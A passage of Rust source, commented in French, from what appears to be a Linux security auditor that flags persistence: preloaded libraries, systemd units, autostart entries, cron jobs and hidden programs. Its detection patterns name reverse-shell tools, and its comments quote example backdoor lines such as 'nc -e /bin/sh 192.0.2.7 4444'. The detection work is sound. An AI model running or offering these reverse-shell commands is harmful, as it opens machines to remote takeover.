//! Ce qui se cache : persistance (préchargement, services, démarrage de session, cron), programmes
//! privilégiés hors paquet ou modifiés, PATH piégeable.

#![warn(clippy::arithmetic_side_effects, clippy::as_conversions)]

use super::designes::{self, Designe};
use super::*;
use crate::machine::temoins;

/// /usr/bin/x → /bin/x (idem sbin, lib) : chemin d'avant la fusion de /usr.
pub(super) fn chemin_hors_usr(fichier: &Path) -> Option<std::path::PathBuf> {
    let reste = fichier.strip_prefix("/usr").ok()?;
    ["bin", "sbin", "lib", "lib64"]
        .iter()
        .any(|d| reste.starts_with(d))
        .then(|| Path::new("/").join(reste))
}

/// Paquet donné par « dpkg -S » : « libc6:amd64, libc6-dbg: /chemin » → « libc6:amd64 ». Les lignes
/// « diversion by … » parlent d'un fichier détourné, pas de son propriétaire.
pub(super) fn paquet_dpkg(texte: &str) -> Option<String> {
    texte
        .lines()
        .filter(|l| !l.starts_with("diversion "))
        .find_map(|l| l.split_once(": ")?.0.split(", ").next().map(str::to_string))
}

/// Empreinte SHA-256 enregistrée pour ce fichier dans le mtree d'un paquet pacman (« ./usr/bin/sudo … sha256digest=… »).
pub(super) fn empreinte_mtree(mtree: &str, fichier: &Path) -> Option<String> {
    let debut = format!(".{} ", fichier.display());
    mtree
        .lines()
        .find(|l| l.starts_with(&debut))?
        .split_whitespace()
        .find_map(|c| c.strip_prefix("sha256digest="))
        .map(str::to_string)
}

/// Sortie de dpkg --verify ou rpm -V : le 3e caractère vaut « 5 » quand le contenu (empreinte) a changé.
/// Les autres différences (date, droits) ne prouvent pas un remplacement du programme.
pub(super) fn contenu_modifie(verif: &str, fichier: &Path) -> bool {
    let chemin = fichier.to_string_lossy();
    verif
        .lines()
        .any(|l| l.split_whitespace().last() == Some(&*chemin) && l.chars().nth(2) == Some('5'))
}

/// Dossiers du PATH dangereux : modifiables par tout le monde (sans « sticky bit ») ou relatifs (« . »).
pub(super) fn path_dangereux(path: &str, droits: impl Fn(&str) -> Option<u32>) -> Vec<String> {
    path.split(':')
        .filter(|d| d.is_empty() || !d.starts_with('/') || droits(d).is_some_and(|m| m & 0o002 != 0 && m & 0o1000 == 0))
        .map(|d| {
            if d.is_empty() {
                "(vide = dossier courant)".to_string()
            } else {
                d.to_string()
            }
        })
        .collect()
}

/// Un fichier de démarrage ou de configuration tel qu'il est montré : « ~/… » sous le dossier personnel `maison`, et
/// rendu inoffensif (dans /etc/profile.d ou ~/.config/autostart, le nom est celui qu'a choisi qui a posé le fichier).
pub(super) fn court(p: &Path, maison: &Path) -> String {
    crate::ui::affichable(
        &p.strip_prefix(maison)
            .map_or_else(|_| p.display().to_string(), |r| format!("~/{}", r.display())),
    )
}

/// Ligne de configuration vide ou en commentaire (shell, systemd, .desktop : « # » ; Lua : « -- » ; « ; »).
pub(super) fn commentaire(ligne: &str) -> bool {
    let l = ligne.trim_start();
    l.is_empty() || l.starts_with('#') || l.starts_with("--") || l.starts_with(';') || l.starts_with("//")
}

/// Dossiers cachés du dossier personnel où vivent normalement des programmes.
pub(super) const DOSSIERS_CACHES_NORMAUX: [&str; 10] = [
    ".local",
    ".config",
    ".cargo",
    ".rustup",
    ".nix-profile",
    ".npm-global",
    ".bun",
    ".deno",
    ".dotnet",
    ".steam",
];

/// Pourquoi cette commande a la forme d'une porte dérobée, ou `None` : shell inversé, téléchargé ou décodé puis passé
/// à un interpréteur, code caché en base64. Une telle ligne n'est jamais déclarable normale, quelle que soit sa
/// syntaxe (`cibles`).
pub(super) fn raison_grave(commande: &str) -> Option<&'static str> {
    // Les mots coupés aussi sur ce qui sépare ou groupe les commandes du shell, comme pour la chasse :
    // « (nc -e /bin/sh … &) » ou « x;nc -e … » cachaient nc dans « (nc » ou « x;nc ». Un programme se compare par
    // son nom de fichier (« /bin/nc »), une option telle quelle.
    let mots_du_shell: Vec<&str> = crate::machine::chasse::mots(commande)
        .into_iter()
        .map(|(m, _)| m.trim_matches(|c| c == '"' || c == '\''))
        .collect();
    let a = |m: &str| {
        mots_du_shell
            .iter()
            .any(|x| *x == m || crate::machine::chasse::nom_de_fichier(x) == m)
    };
    if commande.contains("/dev/tcp/") || commande.contains("/dev/udp/") {
        return Some(tr!(
            "connexion réseau ouverte par le shell (shell inversé)",
            "network connection opened by the shell (reverse shell)"
        ));
    }
    // « -e », « -c », « --exec », « --sh-exec », aussi collés à leur valeur (« -e/bin/sh », « --exec=… »).
    let donne_un_shell = mots_du_shell.iter().any(|x| {
        ["-e", "-c", "--exec", "--sh-exec", "--lua-exec"].iter().any(|o| {
            x.strip_prefix(o)
                .is_some_and(|r| r.is_empty() || r.starts_with(['=', '/']))
        })
    });
    if (a("nc") || a("ncat") || a("netcat")) && donne_un_shell {
        return Some(tr!(
            "netcat qui donne un shell (shell inversé)",
            "netcat giving a shell (reverse shell)"
        ));
    }
    let minuscules = commande.to_ascii_lowercase();
    if a("socat") && (minuscules.contains("exec:") || minuscules.contains("system:")) {
        return Some(tr!(
            "socat qui donne un shell (shell inversé)",
            "socat giving a shell (reverse shell)"
        ));
    }
    // Téléchargé ou décodé puis passé à un interpréteur : le même jugement que pour les programmes en marche.
    if let Some(motif) = crate::machine::chasse::passe_a_un_shell(commande) {
        return Some(motif.raison);
    }
    if commande.contains("base64 -d") || commande.contains("base64 --decode") {
        return Some(tr!("commande cachée en base64", "command hidden in base64"));
    }
    None
}

/// Pourquoi cette commande lancée automatiquement ressemble à une porte dérobée, ou `None`. `lancement` : la ligne
/// est une commande lancée (service, démarrage de session), pas un fichier de configuration du shell, où « /tmp »
/// apparaît sans rien lancer. Seules des formes précises sont retenues, pour ne pas alerter sur chaque script maison.
pub(super) fn commande_suspecte(commande: &str, lancement: bool) -> Option<&'static str> {
    if let Some(raison) = raison_grave(commande) {
        return Some(raison);
    }
    if !lancement {
        return None;
    }
    // Coupée sur tout blanc, Unicode compris : plus de mots jugés, jamais moins (le témoin, lui, refuse un tel blanc).
    let mots: Vec<&str> = commande
        .split_whitespace()
        .map(|m| m.trim_matches(|c| c == '"' || c == '\''))
        .collect();
    // Programme lancé : premier mot, sans les préfixes de systemd (« -/usr/bin/x », « @ », « + », « ! »).
    let programme = mots.first()?.trim_start_matches(['-', '@', '+', '!', ':']);
    // Un interpréteur ou un lanceur (« /usr/bin/bash ~/.x/a.sh », « env /tmp/x ») : ce qu'il lit ou lance se juge
    // comme le programme lui-même.
    let mut a_juger = vec![programme];
    if designes::lit_un_script(programme) {
        a_juger.extend(mots.iter().skip(1).copied());
    }
    let maison = home();
    for p in a_juger {
        if let Some(raison) = programme_cache(p, &maison) {
            return Some(raison);
        }
    }
    None
}

/// Un programme lancé depuis un dossier temporaire ou un dossier caché du dossier personnel `maison`.
fn programme_cache(programme: &str, maison: &str) -> Option<&'static str> {
    if ["/tmp/", "/var/tmp/", "/dev/shm/"]
        .iter()
        .any(|d| programme.starts_with(d))
    {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    let relatif = programme
        .strip_prefix("~/")
        .or_else(|| programme.strip_prefix("$HOME/"))
        .or_else(|| programme.strip_prefix("${HOME}/"))
        .or_else(|| programme.strip_prefix("%h/"))
        .or_else(|| {
            (!maison.is_empty())
                .then(|| programme.strip_prefix(&format!("{maison}/")))
                .flatten()
        });
    if let Some(r) = relatif {
        let premier = r.split('/').next().unwrap_or("");
        if premier.starts_with('.') && r.contains('/') && !DOSSIERS_CACHES_NORMAUX.contains(&premier) {
            return Some(tr!(
                "programme rangé dans un dossier caché du dossier personnel",
                "program stored in a hidden folder of the home folder"
            ));
        }
    }
    None
}

/// Commande lancée par une ligne de démarrage : « ExecStart=… » (systemd), « Exec=… » (.desktop),
/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien.
pub(super) fn commande_lancee(ligne: &str) -> Option<String> {
    commande_lancee_lue(ligne).map(|(c, _)| c)
}

/// `commande_lancee`, et si elle est ambiguë : une ligne Lua où du texte suit le dernier guillemet, ou dont la
/// commande garde un guillemet (« o.exec_on_start("/x/run" .. suffixe) » lance autre chose que « /x/run »). Jugée
/// quand même ; seul le choix « normal » la refuse.
fn commande_lancee_lue(ligne: &str) -> Option<(String, bool)> {
    let l = ligne.trim();
    if commentaire(l) {
        return None;
    }
    if let Some((cle, valeur)) = l.split_once('=') {
        let cle = cle.trim();
        if cle.starts_with("Exec") || ["exec-once", "exec", "execr", "execr-once", "exec-shutdown"].contains(&cle) {
            return Some((valeur.trim().to_string(), false));
        }
    }
    if ["exec_on_start", "launch_on_start", "exec_once", "exec-once"]
        .iter()
        .any(|m| l.contains(m))
    {
        let debut = l.find(['"', '\''])?;
        let fin = l.rfind(['"', '\''])?;
        // `get` rend `None` quand la fin précède le début : le même cas que `fin > debut` refusait.
        let dedans = l.get(debut.checked_add(1)?..fin)?;
        let apres = l.get(fin.checked_add(1)?..).unwrap_or_default();
        let ambigue =
            dedans.contains(['"', '\'']) || apres.contains(|c: char| !matches!(c, ')' | ',' | ';' | ' ' | '\t'));
        return Some((dedans.to_string(), ambigue));
    }
    None
}

/// Ligne qui précharge une bibliothèque dans tous les programmes (LD_PRELOAD, LD_AUDIT) ; « unset » la retire.
pub(super) fn definit_prechargement(ligne: &str) -> bool {
    !commentaire(ligne)
        && (ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT"))
        && !ligne.trim_start().starts_with("unset")
}

/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd), liens vers un fichier compris ; les liens
/// d'activation (dossiers « *.wants ») ne sont pas parcourus.
pub(super) fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
    let mut trouve = Vec::new();
    for e in std::fs::read_dir(dossier).into_iter().flatten().flatten() {
        let p = e.path();
        let Ok(t) = e.file_type() else { continue };
        // Un lien vers un fichier ordinaire se lit comme lui : sinon, une unité acceptée remplacée par un lien vers
        // une autre sortirait de la lecture (et son alerte avec). Jamais un lien vers un dossier (une boucle).
        let fichier = t.is_file() || (t.is_symlink() && std::fs::metadata(&p).is_ok_and(|m| m.is_file()));
        if t.is_dir() && (p.extension().is_some_and(|x| x == "d") || dossier.ends_with("hypr")) {
            trouve.extend(fichiers_de(&p, extensions));
        } else if fichier && p.extension().is_some_and(|x| extensions.iter().any(|e| x == *e)) {
            trouve.push(p);
        }
    }
    trouve
}

/// Une ligne signalée dans une clé : sa source et l'empreinte de son texte (jamais le texte, écrit par qui l'a posée).
fn source_de(origine: &str, ligne: &str) -> String {
    format!("{origine}#{}", crate::modele::id::trace(ligne))
}

/// L'objet de l'alerte des lancements : ses lignes signalées, triées et sans double (l'ordre de lecture ne compte
/// pas, deux lignes identiques comptent une fois).
fn objet_des_lancements(mut sources: Vec<String>) -> crate::modele::Objet {
    sources.sort();
    sources.dedup();
    crate::modele::Objet::de("lancements", &sources.join(","))
}

/// Lancements automatiques détournés : bibliothèque préchargée dans tous les programmes, services et démarrage
/// de session qui lancent un shell inversé ou un programme caché, services système ajoutés à la main.
pub(super) fn persistance() -> Vec<Constat> {
    persistance_dans(
        Path::new("/"),
        Path::new(&home()),
        |var| std::env::var_os(var),
        sortie("crontab", &["-l"]),
        Paquets::detecter(),
    )
}

/// La persistance lue sous `racine` (« / » au bilan ; une arborescence fabriquée pour le corpus de détection), le
/// dossier personnel `maison`, les variables de cette session (`variable`), la crontab du compte et le gestionnaire
/// de paquets donnés : la même lecture et le même jugement, sans rien toucher hors de la racine.
pub(super) fn persistance_dans(
    racine: &Path,
    maison: &Path,
    variable: impl Fn(&str) -> Option<std::ffi::OsString>,
    crontab: Option<String>,
    gestion: Option<Paquets>,
) -> Vec<Constat> {
    // Une racine relative (« » au lieu de « / ») ferait lire ld.so.preload, profile.d, cron.d… sous le dossier
    // courant : rien n'y serait, et le verdict serait « sain » (campagne n° 4, M6).
    debug_assert!(
        racine.is_absolute(),
        "racine de la persistance relative : {}",
        racine.display()
    );
    #[cfg(test)]
    tests::RACINE_LUE.with(|r| *r.borrow_mut() = Some(racine.to_path_buf()));
    // Une variable XDG relative est ignorée par systemd (la spécification XDG) : seule une absolue, ailleurs que le
    // dossier par défaut, ajoute un dossier.
    let deplace = |nom: &str, defaut: &str| {
        variable(nom)
            .map(std::path::PathBuf::from)
            .filter(|p| p.is_absolute() && *p != maison.join(defaut))
    };
    let mut t = Lancements {
        r: Releveur {
            racine: racine.to_path_buf(),
            maison: maison.to_path_buf(),
            runtime: variable("XDG_RUNTIME_DIR")
                .map(std::path::PathBuf::from)
                .filter(|p| p.is_absolute()),
            config: deplace("XDG_CONFIG_HOME", ".config"),
            donnees: deplace("XDG_DATA_HOME", ".local/share"),
            zdot: deplace("ZDOTDIR", ""),
            environnement: None,
            budget: temoins::Budget::default(),
        },
        ..Lancements::default()
    };
    // Un dossier personnel inconnu ou relatif : les fichiers du compte se liraient sous le dossier courant, et
    // l'absence de tout y passerait pour « rien de suspect » (campagne E, M-f). C'est dit, non vérifié.
    if !maison.is_absolute() {
        t.sources.push(source_de("maison", "relatif"));
        t.retraits.push(None);
        t.temoins.push(Err(temoins::Refus(
            tr!("le dossier personnel est inconnu", "the home folder is unknown").to_string(),
        )));
        t.suspects.push(
            tr!(
                "dossier personnel inconnu ou relatif : les démarrages du compte ne sont pas vérifiés",
                "home folder unknown or relative: the account's startup files are not checked"
            )
            .to_string(),
        );
    }
    // Un dossier personnel absent ou qu'on ne peut pas lire, ou un des dossiers où le compte range ses démarrages :
    // rien n'y serait trouvé, et ce ne serait pas « rien de suspect » (vérifications de la campagne E, N9). Un
    // sous-dossier absent, lui, ne lance rien.
    if maison.is_absolute() {
        for (rang, dossier) in [
            "",
            ".config",
            ".config/systemd",
            ".config/systemd/user",
            ".config/autostart",
            ".config/hypr",
            ".local/share/systemd/user",
        ]
        .into_iter()
        .enumerate()
        {
            let chemin = maison.join(dossier);
            let Err(e) = std::fs::read_dir(&chemin) else {
                continue;
            };
            if rang > 0 && e.kind() == std::io::ErrorKind::NotFound {
                continue;
            }
            let montre = if rang == 0 {
                tr!("le dossier personnel", "the home folder").to_string()
            } else {
                crate::ui::affichable(&t.r.montre(&chemin))
            };
            t.sources
                .push(source_de("maison", &format!("illisible {}", t.r.montre(&chemin))));
            t.retraits.push(None);
            t.temoins.push(Err(temoins::Refus(trf!(
                "{montre} ne se lit pas : les démarrages du compte ne sont pas vérifiés",
                "{montre} cannot be read: the account's startup files are not checked"
            ))));
            t.suspects.push(trf!(
                "{montre} ne se lit pas ({e}) : les démarrages du compte ne sont pas vérifiés",
                "{montre} cannot be read ({e}): the account's startup files are not checked"
            ));
            if rang == 0 {
                break;
            }
        }
    }
    let (demarrage, hypr) = fichiers_de_demarrage(&t.r);
    let mut configuration = fichiers_de_configuration(&t.r);
    t.r.environnement = Some(environnement(&t.r, configuration.clone(), hypr.clone()));
    lire_prechargement(racine, &variable, gestion, &mut t);
    // Les fichiers de Hyprland sont aussi des fichiers de configuration, après les autres.
    configuration.extend(hypr);
    juger_configuration(&configuration, &demarrage, maison, &mut t);
    juger_demarrage(&demarrage, maison, &mut t);
    juger_cron(racine, crontab, &mut t);
    let services = services_ajoutes(racine, gestion, &mut t.r);
    let mut constats = vec![constat_des_lancements(t)];
    constats.extend(services);
    constats
}

/// Les lignes signalées par la lecture de la persistance : critiques, suspectes, et d'où vient chacune (`source_de`,
/// sans langue ni numéro de ligne) : l'objet de l'alerte, qui change dès qu'une autre ligne ou une autre source
/// s'ajoute (accepter les lignes d'aujourd'hui ne tait jamais celles de demain, même dans un fichier déjà signalé).
#[derive(Default)]
struct Lancements {
    critiques: Vec<String>,
    suspects: Vec<String>,
    sources: Vec<String>,
    /// Pour chaque ligne signalée, le fichier et la ligne telle qu'écrite (fin « \r » comprise) qu'un geste de
    /// défense retirerait ; `None` : signalée ailleurs que dans un fichier (variable de la session, crontab du compte).
    retraits: Vec<Option<(String, String)>>,
    /// Pour chaque ligne signalée, ce qu'un choix « normal » lierait (`machine::temoins`), ou pourquoi on ne peut pas.
    temoins: Vec<Result<temoins::Temoin, temoins::Refus>>,
    r: Releveur,
}

/// Ce qu'il faut pour relever ce que désigne une ligne : la racine lue, le dossier personnel, le dossier de la
/// session (XDG_RUNTIME_DIR, où systemd range aussi des unités de l'utilisateur) et le budget du bilan.
#[derive(Default)]
struct Releveur {
    racine: std::path::PathBuf,
    maison: std::path::PathBuf,
    runtime: Option<std::path::PathBuf>,
    /// XDG_CONFIG_HOME et XDG_DATA_HOME, s'ils mènent ailleurs que les dossiers par défaut du dossier personnel.
    config: Option<std::path::PathBuf>,
    donnees: Option<std::path::PathBuf>,
    /// ZDOTDIR, s'il mène ailleurs que le dossier personnel : zsh y lit .zshenv, .zprofile, .zshrc, .zlogin.
    zdot: Option<std::path::PathBuf>,
    /// Les lignes des fichiers d'environnement des sessions qui nomment une variable sensible (`environnement`), liées
    /// à chaque ligne déclarée normale ; `None` : pas relevées, donc rien ne se déclare.
    environnement: Option<Result<(String, temoins::Etat), temoins::Refus>>,
    budget: temoins::Budget,
}

impl Releveur {
    /// Un chemin absolu de l'ordinateur, lu sous la racine (une arborescence fabriquée pour les essais et le
    /// corpus) ; le dossier personnel y est déjà.
    fn sous(&self, chemin: &Path) -> std::path::PathBuf {
        if self.racine == Path::new("/") || chemin.starts_with(&self.racine) {
            chemin.to_path_buf()
        } else {
            self.racine.join(chemin.strip_prefix("/").unwrap_or(chemin))
        }
    }

    /// Un chemin lu, tel qu'il se montre et se lie : « ~/… » dans le dossier personnel (le même fichier pour le
    /// même compte), sinon absolu, sans la racine fabriquée. Pas nettoyé ici (`court`) : le témoin lie le chemin
    /// exact et ne nettoie que ce qu'il montre.
    fn montre(&self, lu: &Path) -> String {
        if let Ok(r) = lu.strip_prefix(&self.maison) {
            return format!("~/{}", r.to_string_lossy());
        }
        if self.racine != Path::new("/")
            && let Ok(r) = lu.strip_prefix(&self.racine)
        {
            return format!("/{}", r.to_string_lossy());
        }
        lu.to_string_lossy().into_owned()
    }
}

/// Où se trouve une ligne de démarrage : la façon de lire sa commande en dépend (`designes::Contexte`).
#[derive(Clone, Copy, PartialEq, Eq)]
enum Sorte {
    /// Une unité systemd, de l'utilisateur ou du système.
    Unite {
        utilisateur: bool,
    },
    Bureau,
    Shell,
}

impl Sorte {
    fn de(f: &Path, r: &Releveur) -> Sorte {
        if f.extension().is_some_and(|x| x == "desktop") {
            Sorte::Bureau
        } else if f.starts_with(r.maison.join(".config/hypr"))
            || r.config
                .as_ref()
                .is_some_and(|c| f.starts_with(r.sous(&c.join("hypr"))))
            || f.extension().is_some_and(|x| x == "lua")
        {
            Sorte::Shell
        } else {
            Sorte::Unite {
                utilisateur: !f.starts_with(r.sous(Path::new("/etc/systemd/system"))),
            }
        }
    }

    fn contexte(self, maison: &str) -> designes::Contexte<'_> {
        match self {
            Sorte::Unite { utilisateur: true } => designes::Contexte::Unite(Some(maison)),
            Sorte::Unite { utilisateur: false } => designes::Contexte::Unite(None),
            Sorte::Bureau => designes::Contexte::Bureau,
            Sorte::Shell => designes::Contexte::Shell,
        }
    }
}

/// Pourquoi une ligne ne dit pas sans ambiguïté ce qu'elle lance, prêt à suivre « la ligne « … » ».
fn raison_du_flou(f: designes::Flou) -> &'static str {
    use designes::Flou;
    match f {
        Flou::Syntaxe => tr!(
            "ne dit pas sans ambiguïté ce qu'elle lance (variable, sous-commande, tube, joker, guillemet ou code de systemd)",
            "does not say unambiguously what it starts (variable, subcommand, pipe, wildcard, quote or systemd specifier)"
        ),
        Flou::Blanc => tr!(
            "contient un blanc inhabituel ou un caractère invisible : l'écran ne la montre pas telle qu'elle se lit",
            "contains an unusual space or an invisible character: the screen does not show it the way it is read"
        ),
        Flou::Octet => tr!(
            "contient un octet qui n'est pas du texte (UTF-8) : ce qui se montre ne serait pas ce qui se lance",
            "contains a byte that is not text (UTF-8): what is shown would not be what is started"
        ),
        Flou::Argument => tr!(
            "donne un mot sans chemin à un programme non reconnu : Vanguard ne peut pas savoir ce qu'il lit",
            "gives a word without a path to an unrecognized program: Vanguard cannot know what it reads"
        ),
        Flou::Processus => tr!(
            "nomme un chemin par /proc, /dev, « . » ou « .. » : le fichier désigné dépend du programme qui le lit",
            "names a path through /proc, /dev, “.” or “..”: the file it names depends on the program that reads it"
        ),
        Flou::Relatif => tr!(
            "nomme un chemin relatif, qui dépend du dossier courant",
            "names a relative path, which depends on the current folder"
        ),
        Flou::NomNu => tr!(
            "nomme son programme sans chemin : il est cherché dans le PATH au lancement",
            "names its program without a path: it is looked up in PATH at launch"
        ),
        Flou::Maison => tr!(
            "désigne le dossier personnel par une variable (~, $HOME), qu'un autre fichier peut changer",
            "refers to the home folder through a variable (~, $HOME) that another file can change"
        ),
        Flou::Interprete => tr!(
            "lance un interpréteur sans script lié (code dans la ligne, module, entrée standard)",
            "starts an interpreter without a bound script (inline code, module, standard input)"
        ),
        Flou::Lanceur => tr!(
            "passe par un lanceur (env, nohup, sudo…) qui lance une autre commande",
            "goes through a launcher (env, nohup, sudo…) that starts another command"
        ),
        Flou::Option => tr!(
            "colle un chemin à une option, une forme qui n'est pas suivie",
            "glues a path to an option, a form that is not tracked"
        ),
        Flou::Trop => tr!(
            "désigne trop de fichiers, ou un chemin trop long",
            "names too many files, or a path that is too long"
        ),
        Flou::Vide => tr!("ne désigne aucun fichier", "names no file"),
    }
}

/// Les fichiers que désigne une ligne (`designes`), relevés sous la racine ; `commande` : une commande lancée, dont le
/// premier est le programme (sinon, des bibliothèques préchargées). `Err` : la ligne a la forme d'une porte dérobée,
/// ne dit pas sans ambiguïté ce qu'elle lance, lance une copie d'un interpréteur sous un autre nom, ou l'un d'eux ne
/// se relève pas.
fn cibles(
    r: &mut Releveur,
    d: Designe,
    ligne: &str,
    commande: bool,
) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
    // Exclue par sa raison, pas par sa syntaxe : « nc -e /bin/sh 192.0.2.7 4444 » se lit sans ambiguïté.
    if raison_grave(ligne).is_some() {
        return Err(temoins::Refus(
            tr!(
                "cette ligne a la forme d'une porte dérobée (shell inversé, script téléchargé ou caché) : elle ne se déclare jamais normale",
                "this line has the shape of a backdoor (reverse shell, downloaded or hidden script): it can never be declared normal"
            )
            .to_string(),
        ));
    }
    let chemins = match d {
        Designe::Chemins(c) => c,
        Designe::Indefini(flou) => {
            return Err(temoins::Refus(trf!(
                "la ligne « {} » {}",
                "the line “{}” {}",
                crate::ui::couper(&crate::ui::affichable(ligne.trim()), 80),
                raison_du_flou(flou)
            )));
        }
    };
    if commande && let Some(programme) = chemins.first() {
        copie_d_un_interprete(r, programme)?;
    }
    let mut sortie = Vec::with_capacity(chemins.len());
    for (i, c) in chemins.into_iter().enumerate() {
        let lu = r.sous(Path::new(&c));
        let montre = r.montre(&lu);
        // Seul le programme (ou une bibliothèque préchargée) peut être un binaire : tout autre fichier est lu par un
        // interpréteur, et doit se montrer comme il s'exécute (vérification de la campagne E, N4).
        let programme = !commande || i == 0;
        sortie.push((montre, temoins::etat_de_la_cible(&lu, programme, &mut r.budget)?));
    }
    Ok(sortie)
}

/// Les dossiers où se trouvent les interpréteurs et les lanceurs du système, à comparer à un programme inconnu.
const DOSSIERS_DES_INTERPRETES: [&str; 4] = ["/usr/bin", "/bin", "/usr/local/bin", "/usr/sbin"];

/// Un programme qui n'est ni un interpréteur ni un lanceur par son nom, mais dont le contenu est celui d'un
/// interpréteur ou d'un lanceur du système (une copie ou un lien dur sous un autre nom) : ses options (« -mmodule »,
/// « -fMakefile ») lui font lire des fichiers que rien ne lie, et la ligne ne se déclare pas. Comparé d'abord par
/// appareil et numéro, puis par taille, et seulement à taille égale par le contenu (`Err` : c'en est une copie).
fn copie_d_un_interprete(r: &mut Releveur, programme: &str) -> Result<(), temoins::Refus> {
    use std::os::unix::fs::MetadataExt as _;
    if designes::lit_un_script(programme) {
        return Ok(());
    }
    let lu = r.sous(Path::new(programme));
    let Ok(m) = std::fs::metadata(&lu) else {
        return Ok(());
    };
    if !m.is_file() {
        return Ok(());
    }
    let mut contenu: Option<[u8; 32]> = None;
    for d in DOSSIERS_DES_INTERPRETES {
        for e in std::fs::read_dir(r.sous(Path::new(d))).into_iter().flatten().flatten() {
            let nom = e.file_name();
            let Some(nom) = nom.to_str() else { continue };
            if !designes::lit_un_script(nom) {
                continue;
            }
            let Ok(autre) = std::fs::metadata(e.path()) else {
                continue;
            };
            if !autre.is_file() || autre.len() != m.len() {
                continue;
            }
            let copie = (autre.dev() == m.dev() && autre.ino() == m.ino())
                || {
                    let soi = match contenu {
                        Some(c) => Some(c),
                        None => empreinte_bornee(&lu, &mut r.budget),
                    };
                    contenu = soi;
                    // Un contenu qui ne se compare pas (illisible, budget du bilan épuisé) n'est pas « pas une copie » :
                    // dans le doute, refusé (deuxième vérification de la campagne E).
                    match (soi, empreinte_bornee(&e.path(), &mut r.budget)) {
                        (Some(a), Some(b)) => a == b,
                        _ => {
                            return Err(temoins::Refus(trf!(
                                "{} ne se compare pas à {} (illisible, ou trop de fichiers relus pour ce bilan) : ce pourrait en être une copie",
                                "{} cannot be compared with {} (unreadable, or too many files re-read for this check): it could be a copy of it",
                                crate::ui::affichable(&r.montre(&lu)),
                                crate::ui::affichable(&format!("{d}/{nom}"))
                            )));
                        }
                    }
                };
            if copie {
                return Err(temoins::Refus(trf!(
                    "{} est une copie de {} sous un autre nom : ses options lui font lire des fichiers que Vanguard ne suit pas",
                    "{} is a copy of {} under another name: its options make it read files that Vanguard does not track",
                    crate::ui::affichable(&r.montre(&lu)),
                    crate::ui::affichable(&format!("{d}/{nom}"))
                )));
            }
        }
    }
    Ok(())
}

/// Le BLAKE3 d'un fichier ordinaire pris sur le budget du bilan ; `None` : illisible ou budget épuisé.
fn empreinte_bornee(chemin: &Path, budget: &mut temoins::Budget) -> Option<[u8; 32]> {
    let m = std::fs::metadata(chemin).ok()?;
    if !budget.prendre(m.len()) {
        return None;
    }
    let lu = temoins::lire_borne(chemin, m.len()).ok()?;
    lu.entier.then(|| *blake3::hash(&lu.octets).as_bytes())
}

/// Au-delà de `TEMOINS_MAX` lignes, l'alerte ne se déclare pas : les suivantes ne sont pas relues.
fn place(t: &Lancements) -> Result<(), temoins::Refus> {
    if t.temoins.len() >= temoins::TEMOINS_MAX {
        return Err(temoins::Refus(trf!(
            "plus de {} lignes signalées, plus que celles qui se montrent avant un tel choix",
            "more than {} reported lines, more than can be shown before such a choice",
            temoins::TEMOINS_MAX
        )));
    }
    Ok(())
}

/// Au plus autant d'octets lus dans un fichier de démarrage ou de configuration.
const LECTURE_MAX: u64 = 32 * 1024 * 1024;

/// Un fichier de démarrage ou de configuration lu : ses octets (liés par un choix), son texte (jugé ; un octet qui
/// n'est pas de l'UTF-8 ne fait plus sauter le fichier), et s'il a été lu en entier.
struct Lecture {
    octets: Vec<u8>,
    texte: String,
    entier: bool,
}

/// Lit un fichier de démarrage ou de configuration, borné (`temoins::lire_borne` : jamais un tube, un périphérique
/// ni plus de `LECTURE_MAX` octets). Ce qui ne se lit pas en entier, ou un tube nommé à la place du fichier, est dit
/// dans l'alerte, jamais compté comme sain ; absent ou interdit de lecture, il est sauté comme avant.
fn lire(f: &Path, h: &Path, t: &mut Lancements) -> Option<Lecture> {
    match temoins::lire_borne(f, LECTURE_MAX) {
        Ok(lu) => {
            if !lu.entier {
                non_lu(
                    f,
                    h,
                    t,
                    tr!("trop gros pour être lu en entier", "too large to be read in full"),
                );
            }
            Some(Lecture {
                texte: String::from_utf8_lossy(&lu.octets).into_owned(),
                entier: lu.entier,
                octets: lu.octets,
            })
        }
        Err(_) if std::fs::metadata(f).is_ok_and(|m| std::os::unix::fs::FileTypeExt::is_fifo(&m.file_type())) => {
            non_lu(
                f,
                h,
                t,
                tr!("tube nommé à la place d'un fichier", "named pipe instead of a file"),
            );
            None
        }
        Err(_) => None,
    }
}

/// Un fichier de démarrage ou de configuration qui ne se lit pas en entier : une ligne de l'alerte.
fn non_lu(f: &Path, h: &Path, t: &mut Lancements, raison: &str) {
    t.sources
        .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), "non lu"));
    t.retraits.push(None);
    t.temoins.push(Err(temoins::Refus(trf!(
        "{} ne se lit pas en entier",
        "{} cannot be read in full",
        court(f, h)
    ))));
    t.suspects.push(trf!(
        "{} : {raison}, non vérifié",
        "{}: {raison}, not checked",
        court(f, h)
    ));
}

/// Le témoin d'une ligne `l` (numéro `n`, à partir de 0) du fichier `f`, dont `lu` est le contenu ; pour une ligne
/// d'unité systemd, aussi ce qui change l'unité sans toucher à la ligne (`unite`). `commande` : `designe` vient d'une
/// commande lancée (sinon, d'un préchargement : `cibles`).
#[allow(clippy::too_many_arguments)]
fn temoin_de_ligne(
    t: &mut Lancements,
    fichier: &Path,
    n: usize,
    lu: &Lecture,
    ligne: &str,
    designe: Designe,
    commande: bool,
    sorte: Sorte,
) -> Result<temoins::Temoin, temoins::Refus> {
    place(t)?;
    // Un octet qui n'est pas de l'UTF-8, dans le fichier ou son chemin : lu « avec pertes », il se montrerait et se
    // suivrait autrement que le lanceur, qui garde l'octet tel quel.
    if std::str::from_utf8(&lu.octets).is_err() || fichier.to_str().is_none() {
        return Err(octet_refuse(&court(fichier, &t.r.maison)));
    }
    if !t.r.maison.is_absolute() {
        return Err(temoins::Refus(
            tr!("le dossier personnel est inconnu", "the home folder is unknown").to_string(),
        ));
    }
    let mut cibles = cibles(&mut t.r, designe, ligne, commande)?;
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{} ne se lit pas en entier",
            "{} cannot be read in full",
            court(fichier, &t.r.maison)
        )));
    }
    if let Sorte::Unite { utilisateur } = sorte {
